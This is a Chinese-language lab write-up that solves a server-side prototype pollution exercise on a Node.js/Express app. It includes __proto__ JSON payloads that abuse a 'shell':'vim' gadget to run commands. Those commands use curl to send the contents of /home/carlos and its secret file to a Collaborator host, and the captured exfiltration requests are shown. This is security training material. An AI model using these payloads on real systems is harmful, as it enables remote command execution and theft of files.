# 实验室：通过服务端原型污染窃取敏感数据

本实验室基于 Node.js 和 Express 框架构建，由于不安全地将用户可控输入合并到服务端 JavaScript 对象中，存在服务端原型污染漏洞。

由于服务器的配置，可以通过污染 `Object.prototype` 来注入任意系统命令，这些命令随后会在服务器上执行。

要解决本实验：

1. 找到一个可用于向全局 `Object.prototype` 添加任意属性的原型污染源。
2. 识别一个可用于注入并执行任意系统命令的小工具。
3. 触发远程执行一条命令，将 Carlos 主目录（`/home/carlos`）的内容泄露到公共 Burp Collaborator 服务器。
4. 将该目录中一个秘密文件的内容外泄到公共 Burp Collaborator 服务器。
5. 使用实验室横幅中提供的按钮提交从文件中获得的秘密内容。

在本实验中，你已拥有提升的权限，可以访问管理功能。你可以使用以下凭据登录自己的账户：`wiener:peter`

> **注意**
> 在测试服务端原型污染时，可能会破坏应用程序功能甚至导致服务器完全崩溃。如果实验室发生这种情况，你可以使用实验室横幅中提供的按钮手动重启服务器。请记住，在测试真实网站时，你不太可能有此选项，因此务必谨慎操作。

探测：服务器端原型污染
- UTF 7 字符解析探测
    1. 发送 UTF 7 编码数据
        ```json
        "address_line_1":"+AGYAbwBv-",
        ```
        - 响应
            ```json
            "address_line_1":"+AGYAbwBv-",
            ```
    2. 尝试服务器端原型污染，此处修改为多载荷探测
        ```json
        {
            "address_line_1": "+AGYAbwBv-",
            "address_line_2": "One Wiener Way",
            "city": "Wienerville",
            "postcode": "BU1 1RP",
            "country": "UK",
            "sessionId": "GHGkdpNdZ7Cl8xZ4cDGANmIjxhlVhH39",
            "__proto__": {
                "content-type": "application/json; charset=utf-7",
                "c_foo": "c_bar"
            },
            "n_foo": "n_bar"
        }
        ```
        - 响应
            ```json
            "n_foo": "n_bar", 
            "isAdmin": true, 
            "content-type": 
            "application/json; charset=utf-7", 
            "c_foo": "c_bar"
            ```
            - 此处的原型污染 `"c_foo": "c_bar"` 已被反射
    
    3. 发送步骤1的普通 UTF 7 数据，响应
        ```json
        "address_line_1":"foo",
        ```
        - 成功解码 UTF 7

构造服务器端原型污染
- 带外探测请求
    ```json
    {
        "__proto__": {
            "shell":"vim",
            "input":":! host id.oastify.com\n"
        }
    }
    ```
    - 协作服务器成功收到 DNS 请求

- 带外数据请求探测1
    ```json
    {
        "__proto__": {
            "shell":"vim",
            "input":":! ls /home/carlos | curl -d @- id.oastify.com\n"
        }
    }
    ```

    - 协作服务器收到带外 HTTP 请求
        ```http
        POST / HTTP/1.1
        Host: id.oastify.com
        User-Agent: curl/7.68.0
        Accept: */*
        Content-Length: 15
        Content-Type: application/x-www-form-urlencoded

        node_appssecret
        ```


- 带外数据请求探测2
    ```json
    {
        "__proto__": {
            "shell": "vim",
            "input": ":! curl -d \"$(ls /home/carlos)\" id.oastify.com\n"
        }
    }
    ```
    - 协作服务器收到带外 HTTP 请求
        ```http
        POST / HTTP/1.1
        Host: id.oastify.com
        User-Agent: curl/7.68.0
        Accept: */*
        Content-Length: 16
        Content-Type: application/x-www-form-urlencoded

        node_apps
        secret
        ```

- 带外数据请求
    ```json
    {
        "__proto__": {
            "shell": "vim",
            "input": ":! curl -d \"$(cat /home/carlos/secret)\" id.oastify.com\n"
        }
    }
    ```
    - 协作服务器收到带外 HTTP 请求
        ```http
        POST / HTTP/1.1
        Host: id.oastify.com
        User-Agent: curl/7.68.0
        Accept: */*
        Content-Length: 32
        Content-Type: application/x-www-form-urlencoded

        MEShWFjlwDa92FHHqV9rGsPO0hnq030P
        ```

示例解决方案
- 载荷

    ```json
    "input":":! cat /home/carlos/secret | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"
    ```

    - 使用 base64 编码确保字符传递准确
